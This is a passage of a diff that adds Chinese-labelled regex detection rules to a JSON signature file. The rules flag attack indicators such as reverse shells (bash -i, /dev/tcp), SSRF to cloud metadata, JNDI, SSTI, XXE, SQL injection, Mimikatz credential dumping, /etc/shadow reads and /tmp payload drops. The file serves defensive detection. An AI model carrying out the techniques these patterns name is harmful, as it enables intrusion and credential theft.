+      "generic": false
+    },
+    "dga_hex_subdomain": {
+      "label": "DGA 随机子域查询 (8位hex.<域>)",
+      "regex": "\\b[0-9a-f]{8}\\.[a-z0-9-]+\\.(net|com|org)\\b",
+      "generic": false
+    },
+    "lfi_traversal": {
+      "label": "路径穿越 (../ 连写)",
+      "regex": "(?:\\.\\./){2,}",
+      "generic": false
+    },
+    "node_sandbox_escape": {
+      "label": "Node.js 沙箱逃逸链 (constructor/mainModule)",
+      "regex": "this\\.constructor\\.constructor|mainModule\\.require",
+      "generic": false
+    },
+    "imds_target": {
+      "label": "SSRF 云元数据 (169.254.169.254)",
+      "regex": "169\\.254\\.169\\.254",
+      "generic": false
+    },
+    "mount_overlay_priv": {
+      "label": "overlay 挂载提权尝试",
+      "regex": "mount\\s+-t\\s+overlay",
+      "generic": false
+    },
+    "ssh_landed_key": {
+      "label": "落地密钥 SSH 登录 (ssh -i <key>)",
+      "regex": "ssh\\s+-i\\s+\\S+",
+      "generic": false
+    },
+    "ssh_no_hostcheck": {
+      "label": "SSH 免主机校验 (StrictHostKeyChecking=no)",
+      "regex": "stricthostkeychecking=no",
+      "generic": false
+    },
+    "double_encoded_dot": {
+      "label": "双编码路径穿越 (%%32%65 / .%2e)",
+      "regex": "%%32%65|%252e|\\.%2e",
+      "generic": false
+    },
+    "cgi_sh_path": {
+      "label": "CGI 穿越至 /bin/sh",
+      "regex": "cgi-bin/.*bin/sh",
+      "generic": false
+    },
+    "xp_cmdshell_probe": {
+      "label": "MSSQL xp_cmdshell 探针",
+      "regex": "xp_cmdshell\\(",
+      "generic": false
+    },
+    "com_sun_gadget": {
+      "label": "com.sun JNDI gadget 类名",
+      "regex": "com\\.sun\\.",
+      "generic": false
+    },
+    "gcp_metadata_ssrf": {
+      "label": "GCP 元数据 SSRF (metadata.google.internal)",
+      "regex": "metadata\\.google\\.internal",
+      "generic": false
+    },
+    "net_view_domain": {
+      "label": "域枚举 (net view /domain)",
+      "regex": "net\\s+view\\s+/domain",
+      "generic": false
+    },
+    "smb_admin_share": {
+      "label": "SMB 管理共享挂载 (net use \\\\<ip>\\C$)",
+      "regex": "net\\s+use\\s+\\\\\\\\[\\d.]+\\s*\\\\C\\$",
+      "generic": false
+    },
+    "ssti_object_chain": {
+      "label": "SSTI 对象链逃逸 (__class__/__globals__)",
+      "regex": "\\{\\{.*__(?:class|globals|init)__",
+      "generic": false
+    },
+    "popen_exec": {
+      "label": "popen 命令执行",
+      "regex": "popen\\(",
+      "generic": false
+    },
+    "mass_assignment_admin": {
+      "label": "批量赋值 admin=true",
+      "regex": "\\{\\s*\\\\?\\\"?admin\\\\?\\\"?\\s*:\\s*true",
+      "generic": false
+    },
+    "mysql_load_file": {
+      "label": "MySQL LOAD_FILE 外读",
+      "regex": "LOAD_FILE\\(",
+      "generic": false
+    },
+    "weblogic_shellsession": {
+      "label": "WebLogic MVEL ShellSession 句柄",
+      "regex": "com\\.tangosol\\.coherence.{0,60}ShellSession",
+      "generic": false
+    },
+    "tmui_semicolon_bypass": {
+      "label": "F5 分号路径穿越 (..;/tmui)",
+      "regex": "\\.\\.;/tmui",
+      "generic": false
+    },
+    "tmshcmd_jsp": {
+      "label": "F5 tmshCmd 管理接口",
+      "regex": "tmshCmd\\.jsp",
+      "generic": false
+    },
+    "tmsh_list_auth": {
+      "label": "tmsh 账户枚举 (command=list+auth)",
+      "regex": "command=list\\+auth",
+      "generic": false
+    },
+    "phar_magic": {
+      "label": "PHP phar 魔数头 (__HALT_COMPILER)",
+      "regex": "__HALT_COMPILER",
+      "generic": false
+    },
+    "phar_filename": {
+      "label": "phar 伪装上传 (filename=<n>.phar)",
+      "regex": "filename=\\d+\\.phar",
+      "generic": false
+    },
+    "php_ser_payload": {
+      "label": "PHP 序列化载荷字段 (AAIJABIAAAA)",
+      "regex": "AAIJABIAAAA",
+      "generic": false
+    },
+    "spring_routing_expr": {
+      "label": "Spring 路由表达式注入 (routing-expression)",
+      "regex": "spring\\.cloud\\.function\\.routing-expression",
+      "generic": false
+    },
+    "spel_type_ref": {
+      "label": "SpEL 类型引用链 (T(java.lang.Runtime))",
+      "regex": "T\\(java\\.lang\\.Runtime",
+      "generic": false
+    },
+    "script_javascript": {
+      "label": "${script:javascript 脚本变体",
+      "regex": "\\$\\{script:javascript",
+      "generic": false
+    },
+    "cron_root_write": {
+      "label": "写 root crontab (/var/spool/cron)",
+      "regex": "/var/spool/cron",
+      "generic": false
+    },
+    "bash_reverse_shell": {
+      "label": "bash -i 反连",
+      "regex": "bash(\\+|\\s)-i",
+      "generic": false
+    },
+    "dev_tcp_redir": {
+      "label": "/dev/tcp 反连通道",
+      "regex": "dev/tcp/",
+      "generic": false
+    },
+    "shebang_cmd_inject": {
+      "label": "cmd_inject=#!//bin/bash 注入标记",
+      "regex": "cmd_inject[\\\"']?\\s*[:=]\\s*[\\\"']?#!//bin/bash",
+      "generic": false
+    },
+    "user_register_path": {
+      "label": "注册接口 /user/register",
+      "regex": "/user/register",
+      "generic": false
+    },
+    "union_select_users": {
+      "label": "UNION 查询窃取 users 表",
+      "regex": "UNION\\s+SELECT.{0,80}FROM\\s+users",
+      "generic": false
+    },
+    "api_exec_path": {
+      "label": "命令执行接口 /api/exec",
+      "regex": "/api/exec",
+      "generic": false
+    },
+    "cache_key_traversal": {
+      "label": "cache_key 路径穿越",
+      "regex": "cache_key=\\.\\./",
+      "generic": false
+    },
+    "method_construct_override": {
+      "label": "框架 _method=__construct 参数覆盖",
+      "regex": "_method=__construct",
+      "generic": false
+    },
+    "filter_system_override": {
+      "label": "filter[]=system 过滤执行",
+      "regex": "filter\\[\\]=system",
+      "generic": false
+    },
+    "time_blind_sleep": {
+      "label": "时间盲注 SELECT sleep(5)",
+      "regex": "SELECT sleep\\(5\\)",
+      "generic": false
+    },
+    "server_req_method_probe": {
+      "label": "server[REQUEST_METHOD] 探针",
+      "regex": "server\\[REQUEST_METHOD\\]",
+      "generic": false
+    },
+    "xxe_doctype": {
+      "label": "XXE DOCTYPE 声明",
+      "regex": "<!DOCTYPE",
+      "generic": false
+    },
+    "xxe_entity_system": {
+      "label": "XXE 外部实体 <!ENTITY ... SYSTEM",
+      "regex": "<!ENTITY\\s+\\w+\\s+SYSTEM",
+      "generic": false
+    },
+    "cat_shadow": {
+      "label": "读取 /etc/shadow",
+      "regex": "cat\\s+/etc/shadow",
+      "generic": false
+    },
+    "base64_w0": {
+      "label": "base64 -w0 编码",
+      "regex": "base64\\s+-w0",
+      "generic": false
+    },
+    "fold_w30": {
+      "label": "fold -w 30 分片",
+      "regex": "fold\\s+-w\\s+30",
+      "generic": false
+    },
+    "nslookup_var": {
+      "label": "nslookup $<变量域> 外送",
+      "regex": "nslookup\\s+\\$",
+      "generic": false
+    },
+    "dags_run_path": {
+      "label": "调度接口 /dags/run",
+      "regex": "dags/run",
+      "generic": false
+    },
+    "cmd_inject_semi_id": {
+      "label": "cmd_inject=;id 命令续接探针",
+      "regex": "cmd_inject=;id",
+      "generic": false
+    },
+    "script_exec_text": {
+      "label": "脚本内执行并回显 (.execute().text)",
+      "regex": "execute\\(\\)\\.text",
+      "generic": false
+    },
+    "rclocal_sed_insert": {
+      "label": "sed 植入 rc.local 启动项",
+      "regex": "sed\\s+-i.{0,80}rc\\.local",
+      "generic": false
+    },
+    "tmp_svc_drop": {
+      "label": "落地 /tmp/.svc",
+      "regex": "/tmp/\\.svc",
+      "generic": false
+    },
+    "tmp_implant_drop": {
+      "label": "落地 /tmp/.implant",
+      "regex": "/tmp/\\.implant",
+      "generic": false
+    },
+    "rclocal_append": {
+      "label": "追加写 rc.local",
+      "regex": ">>\\s*/etc/rc\\.local",
+      "generic": false
+    },
+    "fpm_path_param": {
+      "label": "PHP fpm_path 路径参数",
+      "regex": "fpm_path",
+      "generic": false
+    },
+    "xp_dirtree_unc": {
+      "label": "MSSQL xp_dirtree UNC 外连",
+      "regex": "xp_dirtree",
+      "generic": false
+    },
+    "jndi_lookup": {
+      "label": "JNDI 注入查找 (${jndi:...})",
+      "regex": "\\$\\{jndi:(?:ldap|rmi|dns|iiop)",
+      "generic": false
+    },
+    "uploads_jsp_shell": {
+      "label": "上传目录 JSP webshell (/uploads/*.jsp)",
+      "regex": "/uploads/[a-z0-9_]+\\.jsp",
+      "generic": false
+    },
+    "render_api_path": {
+      "label": "反序列化渲染接口 /api/v2/render",
+      "regex": "/api/v2/render",
+      "generic": false
+    },
+    "search_api_path": {
+      "label": "搜索接口 /api/v2/search",
+      "regex": "/api/v2/search",
+      "generic": false
+    },
+    "sqli_and_sleep": {
+      "label": "盲注 ' AND (SELECT sleep(5))--",
+      "regex": "'\\s*AND\\s*\\(\\s*SELECT\\s+sleep\\(",
+      "generic": false
+    },
+    "mimikatz_exec": {
+      "label": "Mimikatz 工具执行 (mimikatz.exe)",
+      "regex": "\\bmimikatz(?:\\.exe)?\\b",
+      "generic": false
+    },
+    "mimikatz_privilege_debug": {
+      "label": "Mimikatz privilege::debug 调试提权",
+      "regex": "privilege::debug",
+      "generic": false
+    },
+    "sekurlsa_logonpasswords": {
+      "label": "Mimikatz sekurlsa::logonpasswords 凭据抓取",
+      "regex": "sekurlsa::logonpasswords",
+      "generic": false
+    },
+    "tmp_dot_download": {
+      "label": "下载载荷落地 /tmp 隐藏文件 (curl/wget -o/-O)",
+      "regex": "(?:curl|wget)\\b[^\\n]{0,80}?-[oO]\\s+/tmp/\\.\\w+",
+      "generic": false
+    },
+    "chmod_x_tmp_dot": {
+      "label": "chmod +x 落地 /tmp 隐藏文件",
+      "regex": "chmod\\s+\\+x\\s+/tmp/\\.\\w+",
+      "generic": false
+    },
+    "exec_tmp_dot": {
+      "label": "执行落地 /tmp 隐藏文件",
+      "regex": "&&\\s*/tmp/\\.\\w+",
+      "generic": false
+    }
+  }
+}
